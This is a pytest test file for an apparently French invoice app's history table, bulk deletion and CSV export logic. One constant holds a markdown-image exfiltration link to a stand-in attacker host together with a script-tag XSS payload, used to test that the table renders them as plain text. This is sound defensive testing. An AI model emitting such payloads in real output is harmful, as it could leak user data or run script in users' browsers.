from __future__ import annotations

from datetime import UTC, date, datetime

import pytest

from src.services.export import DEFAULT_INVOICE_COLUMNS, INVOICE_COLUMNS
from src.ui.errors import ApiError, ApiUnavailableError
from src.ui.export_logic import (
    COLUMN_CHOICES,
    DEFAULT_COLUMNS,
    KIND_CHOICES,
    LOCALE_CHOICES,
    MAX_EXPORT_IDS,
    READY_KEY,
    build_request,
    forget_prepared_file,
    prepare_export,
)
from src.ui.history_logic import (
    COLUMNS,
    MAX_ROWS,
    STATUS_CHOICES,
    delete_many,
    ids_for_selection,
    limit_reached,
    to_frame,
)
from src.ui.models import ExportFile, SummaryView

NOW = datetime(2026, 9, 21, 12, 0, tzinfo=UTC)
IDS = [f"3f9a1c2e-7b4d-4e8a-9c31-5d2f0a6b8e{n:02d}" for n in range(1, 6)]
HOSTILE = "![x](http://evil.example/?d=secret) <script>alert(1)</script>"


def _row(index: int = 1, **overrides) -> SummaryView:
    data = {
        "id": IDS[index - 1],
        "created_at": NOW,
        "display_name": "facture.pdf",
        "status": "high",
        "invoice_number": "F-1",
        "date": "2026-09-10",
        "supplier": "Orange SA",
        "client": "Dupont",
        "total_ttc": 1234.5,
    }
    data.update(overrides)
    return SummaryView(**data)


# --- history: the table ---
def test_the_table_has_the_expected_columns_and_french_formats() -> None:
    frame = to_frame([_row(), _row(2, status="low")])
    assert list(frame.columns) == COLUMNS
    first = frame.iloc[0].to_dict()
    assert first["Total TTC"] == "1 234,50 €" and first["Fiabilité"] == "✅ Fiable"
    assert first["Fournisseur"] == "Orange SA" and first["Fichier"] == "facture.pdf"
    assert frame.iloc[1]["Fiabilité"] == "⚠️ À vérifier"


def test_missing_values_show_a_dash() -> None:
    frame = to_frame([_row(supplier=None, invoice_number=None, date=None, total_ttc=None)])
    assert frame.iloc[0][["Date", "Fournisseur", "N° facture", "Total TTC"]].tolist() == ["—"] * 4


def test_hostile_text_stays_plain_text_in_the_table() -> None:
    frame = to_frame([_row(supplier=HOSTILE, display_name=HOSTILE)])
    assert frame.iloc[0]["Fournisseur"] == HOSTILE  # literal: a dataframe never renders markup
    assert frame.iloc[0]["Fichier"] == HOSTILE


def test_an_empty_list_gives_an_empty_table_with_its_columns() -> None:
    frame = to_frame([])
    assert frame.empty and list(frame.columns) == COLUMNS


def test_selected_positions_are_mapped_to_ids_and_bad_ones_ignored() -> None:
    rows = [_row(1), _row(2), _row(3)]
    assert ids_for_selection(rows, [2, 0]) == [IDS[2], IDS[0]]
    assert ids_for_selection(rows, [-1, 3, 99]) == []
    assert ids_for_selection(rows, []) == []


def test_the_row_limit_is_flagged() -> None:
    assert limit_reached(MAX_ROWS) and not limit_reached(MAX_ROWS - 1)


def test_status_choices_match_the_apis_values() -> None:
    assert STATUS_CHOICES == {"Toutes": None, "✅ Fiables": "high", "⚠️ À vérifier": "low"}


# --- history: deleting several ---
class _Client:
    def __init__(self, *answers) -> None:
        self.answers = list(answers)
        self.deleted: list[str] = []

    def delete(self, record_id: str) -> None:
        self.deleted.append(record_id)
        answer = self.answers.pop(0) if self.answers else None
        if isinstance(answer, Exception):
            raise answer


def test_all_deleted() -> None:
    client, state = _Client(), {"current_record_id": IDS[1]}
    report = delete_many(client, IDS[:3], state)
    assert (report.deleted, report.already_gone, report.failed, report.not_attempted) == (
        3,
        0,
        [],
        0,
    )
    assert client.deleted == IDS[:3] and report.summary == "3 facture(s) supprimée(s)."
    assert "current_record_id" not in state  # the invoice shown on the Result page is forgotten


def test_the_invoice_on_the_result_page_is_kept_when_another_one_is_deleted() -> None:
    state = {"current_record_id": IDS[4]}
    delete_many(_Client(), IDS[:2], state)
    assert state == {"current_record_id": IDS[4]}


def test_a_missing_invoice_counts_as_done() -> None:
    client = _Client(None, ApiError(404, "Facture introuvable."), None)
    report = delete_many(client, IDS[:3])
    assert (report.deleted, report.already_gone, report.failed) == (2, 1, [])
    assert "1 déjà absente(s)" in report.summary


def test_a_problem_with_one_invoice_does_not_stop_the_others() -> None:
    client = _Client(ApiError(422, "Requête invalide."), None, None)
    report = delete_many(client, IDS[:3])
    assert (
        report.deleted == 2 and report.failed == ["Requête invalide."] and report.not_attempted == 0
    )
    assert client.deleted == IDS[:3]


@pytest.mark.parametrize(
    "error",
    [
        ApiError(401, "x"),
        ApiError(429, "x"),
        ApiError(500, "x"),
        ApiError(503, "x"),
        ApiUnavailableError("x"),
    ],
)
def test_an_error_that_would_hit_every_invoice_stops_the_run(error) -> None:
    client = _Client(None, error)
    report = delete_many(client, IDS[:5])
    assert report.deleted == 1 and len(report.failed) == 1
    assert report.not_attempted == 3 and client.deleted == IDS[:2]  # the rest was left alone
    assert "3 non traitée(s)" in report.summary


def test_nothing_to_delete() -> None:
    assert delete_many(_Client(), []).summary == "0 facture(s) supprimée(s)."


# --- export: the request ---
def _request(**overrides):
    args = {
        "scope": "filters",
        "ids": [],
        "kind": "invoices",
        "locale": "fr",
        "columns": list(DEFAULT_COLUMNS),
        "date_from": None,
        "date_to": None,
        "status": None,
    }
    args.update(overrides)
    return build_request(**args)


def test_the_column_choices_are_exactly_the_backends_allowlist() -> None:
    """Contract with the API: a drift (a column added on one side only) fails here."""
    assert list(COLUMN_CHOICES) == list(INVOICE_COLUMNS)
    assert {key: label for key, label in COLUMN_CHOICES.items()} == {
        key: header for key, (header, _extract) in INVOICE_COLUMNS.items()
    }
    assert DEFAULT_COLUMNS == DEFAULT_INVOICE_COLUMNS


def test_a_filter_request_carries_the_period_and_the_status() -> None:
    request, problems = _request(date_from=date(2026, 8, 1), date_to=date(2026, 9, 1), status="low")
    assert problems == []
    assert request.to_kwargs() == {
        "kind": "invoices",
        "locale": "fr",
        "columns": list(DEFAULT_COLUMNS),
        "date_from": date(2026, 8, 1),
        "date_to": date(2026, 9, 1),
        "status": "low",
    }


def test_a_selection_request_sends_ids_and_no_filters() -> None:
    request, problems = _request(
        scope="selection", ids=[IDS[0], IDS[0], IDS[1]], date_from=date(2026, 1, 1), status="low"
    )
    assert problems == []
    kwargs = request.to_kwargs()
    assert kwargs["ids"] == [IDS[0], IDS[1]]  # duplicates removed
    assert "date_from" not in kwargs and "status" not in kwargs


def test_the_lines_file_has_no_column_choice() -> None:
    request, problems = _request(kind="lines", columns=[])
    assert problems == [] and "columns" not in request.to_kwargs()


@pytest.mark.parametrize(
    ("overrides", "message"),
    [
        ({"columns": []}, "au moins une colonne"),
        ({"columns": ["supplier", "__class__"]}, "inconnue"),
        ({"scope": "selection", "ids": []}, "Aucune facture sélectionnée"),
        ({"scope": "selection", "ids": IDS * 41}, "maximum"),
        ({"date_from": date(2026, 9, 2), "date_to": date(2026, 9, 1)}, "précéder"),
    ],
)
def test_impossible_requests_are_explained(overrides: dict, message: str) -> None:
    request, problems = _request(**overrides)
    assert request is None and any(message in problem for problem in problems)


def test_the_selection_limit_matches_the_api() -> None:
    from src.api.routes import MAX_EXPORT_IDS as API_LIMIT

    assert MAX_EXPORT_IDS == API_LIMIT


def test_a_selection_at_the_limit_is_accepted() -> None:
    ids = [f"3f9a1c2e-7b4d-4e8a-9c31-{n:012d}" for n in range(MAX_EXPORT_IDS)]
    assert _request(scope="selection", ids=ids)[1] == []


def test_equal_requests_compare_equal_so_a_stale_file_is_detected() -> None:
    a, _ = _request(status="low")
    b, _ = _request(status="low")
    c, _ = _request(status="high")
    assert a == b and a != c and hash(a) == hash(b)


def test_choices_map_to_the_apis_values() -> None:
    assert set(KIND_CHOICES.values()) == {"invoices", "lines"}
    assert set(LOCALE_CHOICES.values()) == {"fr", "intl"}


def test_prepare_export_passes_the_request_to_the_client() -> None:
    seen: dict = {}

    class Exporter:
        def export_csv(self, **kwargs):
            seen.update(kwargs)
            return ExportFile(filename="invoices.csv", content=b"x")

    request, _ = _request(status="high")
    assert prepare_export(Exporter(), request).filename == "invoices.csv"
    assert seen["status"] == "high" and seen["kind"] == "invoices"


def test_the_prepared_file_is_forgotten_once_taken() -> None:
    state = {READY_KEY: ("request", "file with personal data"), "export_ids": ["x"]}
    forget_prepared_file(state)
    assert READY_KEY not in state and state["export_ids"] == ["x"]  # only the file goes
    forget_prepared_file(state)  # forgetting twice is harmless
